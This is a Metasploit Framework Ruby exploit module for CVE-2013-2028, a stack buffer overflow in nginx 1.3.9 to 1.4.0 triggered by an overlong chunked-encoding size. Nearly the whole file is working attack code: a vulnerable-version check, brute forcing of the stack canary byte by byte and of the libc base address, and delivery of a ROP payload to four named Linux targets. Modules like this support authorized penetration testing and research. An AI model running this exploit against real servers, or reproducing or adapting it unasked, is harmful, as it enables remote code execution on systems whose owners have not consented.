##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit4 < Msf::Exploit::Remote
	include Exploit::Remote::Tcp
	include Msf::Exploit::RopDb
	include Msf::Exploit::Brute

	def initialize(info = {})

		super(update_info(info,
			'Name'           => 'Nginx HTTP Server 1.3.9-1.4.0 Chuncked Encoding Stack Buffer Overflow',
			'Description'    => %q{
				This module exploits a stack buffer overflow in versions 1.3.9 to 1.4.0 of nginx. The exploit first triggers
				an integer overflow in the ngx_http_parse_chunked() by supplying an overly long hex value as chunked block size.
				This value is later used when determining the number of bytes to read into a stack buffer, thus the overflow becomes possible.
			},
			'Author'         =>
				[
					'Greg MacManus',    # original discovery
					'hal',              # exploit development
					'saelo'             # exploit development
			],
			'DisclosureDate' => 'May 07 2013',
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					['CVE', '2013-2028'],
					['OSVDB', '93037'],
					['URL', 'http://nginx.org/en/security_advisories.html'],
					['URL', 'http://packetstormsecurity.com/files/121560/Nginx-1.3.9-1.4.0-Stack-Buffer-Overflow.html']
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'DisabeNops' => false,
					'Space'    => 0x800,
					'BadChars' => "\x0d\x0a\x20",
				},
			'Targets'        =>
				[
					[
						'Kali Linux 1.0 32bit - nginx 1.4.0',
						{
							'Arch' => ARCH_X86,
							'Ropname' => 'Kali Linux 1.0',
							'Platform' => 'linux',
							'Offset' => 5114,
							'Bruteforce' =>
								{
									'Start' => { 'libc_base' => 0xb74c0000},
									'Stop'  => { 'libc_base' => 0xb75d0000},
									'Step'  => 0x1000
								}
						},
					],
					[
						'Red Hat Enterprise Linux 6.4 32bit - nginx 1.4.0',
						{
							'Arch' => ARCH_X86,
							'Ropname' => 'Red Hat Enterprise Linux 6.4',
							'Platform' => 'linux',
							'Offset' => 5130,
							'Bruteforce' =>
								{
									'Start' => { 'libc_base' => 0x00110000},
									'Stop'  => { 'libc_base' => 0x0044f000},
									'Step'  => 0x1000
								}
						}
					],
					[
						'Ubuntu 13.04 32bit - nginx 1.4.0',
					{
						'Arch' => ARCH_X86,
						'Ropname' => 'Ubuntu 13.04',
						'Platform' => 'linux',
						'CanaryOffset' => 5050,
						'Offset' => 12,
						'Bruteforce' =>
							{
								'Start' => { 'libc_base' => 0xb7470000},
								'Stop'  => { 'libc_base' => 0xb757f000},
								'Step'  => 0x1000
							}
						}
					],
					[
						'Debian Squeeze 32bit - nginx 1.4.0',
					{
						'Arch' => ARCH_X86,
						'Ropname' => 'Debian Squeeze',
						'Platform' => 'linux',
						'Offset' => 5130,
						'Bruteforce' =>
							{
								'Start' => { 'libc_base' => 0xb74f0000},
								'Stop'  => { 'libc_base' => 0xb75ff000},
								'Step'  => 0x1000
							}
						}
					],

				],

			'DefaultTarget' => 0
	))

	register_options([
			OptPort.new('RPORT', [true, "The remote HTTP server port", 80])
		], self.class)

	register_advanced_options(
		[
			OptInt.new("CANARY", [false, "Use this value as stack canary instead of brute forcing it", 0xffffffff]),
			OptInt.new("LIBC_BASE", [false, "Use this value as libc base address instead of brute forcing it", 0xffffffff])
		], self.class)

	end

	def check
		@peer = "#{rhost}:#{rport}"

		begin
			res = send_request_fixed(nil)

			if res =~ /^Server: nginx\/(1\.3\.(9|10|11|12|13|14|15|16)|1\.4\.0)/m
				return Exploit::CheckCode::Appears
			elsif res =~ /^Server: nginx/m
				return Exploit::CheckCode::Detected
			end

		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
			print_error("#{@peer} - Connection failed")
		end

		return Exploit::CheckCode::Unknown

	end

	#
	# Generate a random chunk size that will always result
	# in a negative 64bit number when being parsed
	#
	def random_chunk_size(bytes=16)
		return bytes.times.map{ (rand(0x8) + 0x8).to_s(16) }.join
	end

	def send_request_fixed(data)
		connect

		request = 	"GET / HTTP/1.1\r\n"
		request <<	"Host: #{Rex::Text.rand_text_alpha(16)}\r\n"
		request <<	"Transfer-Encoding: Chunked\r\n"
		request <<	"\r\n"
		request <<	"#{data}"

		sock.put(request)

		res = nil

		begin
			res = sock.get_once(-1, 0.5)
		rescue EOFError => e
			# Ignore
		end

		disconnect
		return res

	end

	def brute_exploit(target_addrs)
		connect

		print_status("Sending #{payload.encoded.length} byte payload at base 0x%08x" % target_addrs['libc_base'])

		if target['CanaryOffset'].nil?
			data = 	random_chunk_size(1024)
			data <<	Rex::Text.rand_text_alpha(target['Offset'] - data.size)
		else
			data = 	random_chunk_size(1024)
			data <<	Rex::Text.rand_text_alpha(target['CanaryOffset'] - data.size)
			data <<	[datastore['CANARY']].pack('V')
			data << Rex::Text.rand_text_hex(target['Offset'])
		end

		data <<	generate_rop_payload('nginx', payload.encoded, {'target'=>target['Ropname'], 'base'=> target_addrs['libc_base'] })

		begin
			send_request_fixed(data)

		rescue Errno::ECONNRESET => e
			# Ignore
		end


		handler
	end

	def exploit
		if target['CanaryOffset'].nil?
			print_status("Target not using a stack canary")
		else

			if not datastore['CANARY'] == 0xffffffff
				print_status("Using 0x%08x as stack canary" % datastore['CANARY'])
			else
				print_status("Searching for stack canary")
				canary = find_canary

				if canary.nil? or canary == 0x00000000
					print_error("Unable to find stack canary. Quiting")
					return
				else
					print_status("Canary found: 0x%08x\n" % canary)
					datastore['CANARY'] = canary
				end
			end
		end

		if datastore['LIBC_BASE'] == 0xffffffff
			# Brute force the base address
			super
		else
			brute_exploit({'libc_base' => datastore['LIBC_BASE']})
		end
	end

	def find_canary

		# First byte of the canary is already known
		canary = "\x00"

		# We are going to bruteforce the next 3 bytes one at a time
		3.times do |c|
			print_status("Bruteforcing byte #{c + 1}")

			0.upto(255) do |i|
				data = 	random_chunk_size(1024)
				data <<	Rex::Text.rand_text_alpha(target['CanaryOffset'] - data.size)
				data <<	canary
				data << i.chr

				unless send_request_fixed(data).nil?
					print_status("Byte #{c + 1} found: 0x%02x\n" % i)
					canary << i.chr
					break
				end
			end
		end

		if canary == "\x00"
			return nil
		else
			return canary.unpack('V').first
		end
	end
end
